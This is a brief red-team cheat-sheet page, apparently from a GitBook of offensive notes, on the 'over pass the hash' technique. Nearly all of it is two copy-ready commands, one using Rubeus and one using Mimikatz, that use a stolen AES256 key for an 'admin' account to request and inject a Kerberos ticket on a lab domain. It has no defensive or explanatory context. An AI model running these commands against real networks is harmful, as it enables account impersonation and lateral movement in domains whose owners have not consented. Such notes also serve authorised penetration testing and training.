---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/use-alternate-authentication-material/over-pass-the-hash
---

# Over Pass The Hash

{% code overflow="wrap" %}
```powershell
# Rubeus
Rubeus.exe asktgt /domain:vulnableone.local /user:admin  /aes256:43ac0c70b3fdb36f25c0d5c9cc552fead94c39b705c4088a2bb7219ae9fb6f24 /opsec /nowrap /ptt

# Mimikatz
mimikatz.exe "sekurlsa::pth /user:admin /domain:vulnableone.local /aes256:43ac0c70b3fdb36f25c0d5c9cc552fead94c39b705c4088a2bb7219ae9fb6f24 /ptt" "exit"
```
{% endcode %}
